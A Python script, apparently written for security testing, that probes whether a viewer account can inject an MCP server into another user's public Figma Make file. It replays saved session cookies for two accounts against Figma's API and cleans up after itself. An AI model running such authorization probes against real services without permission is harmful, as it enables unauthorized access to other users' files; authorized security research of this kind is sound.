"""Test whether a viewer can inject an MCP server into a public Make file."""

import io
import json
import sys
import urllib.error
import urllib.request
import uuid


sys.stdout.reconfigure(encoding="utf-8", errors="replace")

BASE = "https://www.figma.com"
UA = "Mozilla/5.0 (Windows NT 10.0; Win64; x64)"
A_UID = "1666382703778278399"
B_UID = "1667396392129259941"
A_PUBLIC_MAKE = "5zb5YkoxMa09KpqOyuLcHD"


def load_cookie(name):
    with io.open(name, encoding="utf-8") as handle:
        return handle.read().strip()


def call(method, path, uid, cookie, body=None):
    headers = {
        "User-Agent": UA,
        "Accept": "application/json",
        "Origin": BASE,
        "Referer": f"{BASE}/make/{A_PUBLIC_MAKE}",
        "X-Figma-User-ID": uid,
        "X-Figma-File-Key": A_PUBLIC_MAKE,
    }
    data = None
    if body is not None:
        headers["Content-Type"] = "application/json"
        data = json.dumps(body).encode()
    if cookie:
        headers["Cookie"] = cookie
    request = urllib.request.Request(BASE + path, data=data, headers=headers, method=method)
    try:
        with urllib.request.urlopen(request, timeout=30) as response:
            return response.status, response.read().decode(errors="replace")
    except urllib.error.HTTPError as error:
        return error.code, error.read().decode(errors="replace")


def parse(raw):
    try:
        return json.loads(raw)
    except json.JSONDecodeError:
        return None


def summary(raw):
    value = parse(raw)
    if not isinstance(value, dict):
        return raw[:220]
    result = {"keys": sorted(value), "status": value.get("status")}
    for key in ("error", "message", "reason"):
        if key in value:
            result[key] = value[key]
    meta = value.get("meta")
    if isinstance(meta, dict):
        result["meta_keys"] = sorted(meta)
        server = meta.get("server")
        if isinstance(server, dict):
            result["server"] = {
                "id": server.get("id"),
                "name": server.get("name"),
                "publish_scope": server.get("publish_scope"),
                "user_id": server.get("user_id"),
            }
    return json.dumps(result, ensure_ascii=False)


cookie_a = load_cookie("ws_cookie_A_new.txt")
cookie_b = load_cookie("ws_cookie_B_new.txt")

for actor_label, uid, cookie in (
    ("A owner baseline", A_UID, cookie_a),
    ("B viewer probe", B_UID, cookie_b),
):
    marker = "authz-probe-" + uuid.uuid4().hex[:12]
    body = {
        "name": marker,
        "url": "https://example.com/mcp",
        "logo_url": "",
        "tagline": "authorization probe",
        "description": "temporary owner-controlled test object",
        "file_key": A_PUBLIC_MAKE,
        "custom_headers": "{}",
        "lg_optimistic_mutation_uuid": str(uuid.uuid4()),
    }
    code, raw = call("POST", "/api/mcp/servers", uid, cookie, body)
    value = parse(raw)
    server = value.get("meta", {}).get("server", {}) if isinstance(value, dict) else {}
    server_id = server.get("id") if isinstance(server, dict) else None
    print(f"[{actor_label}] {code} {summary(raw)}")
    if server_id:
        cleanup_code, cleanup_raw = call(
            "DELETE",
            f"/api/mcp/servers/{server_id}",
            uid,
            cookie,
            {"file_key": A_PUBLIC_MAKE},
        )
        if cleanup_code != 200 and uid != A_UID:
            cleanup_code, cleanup_raw = call(
                "DELETE",
                f"/api/mcp/servers/{server_id}",
                A_UID,
                cookie_a,
                {"file_key": A_PUBLIC_MAKE},
            )
        print(f"[{actor_label} cleanup] {cleanup_code} {summary(cleanup_raw)}")
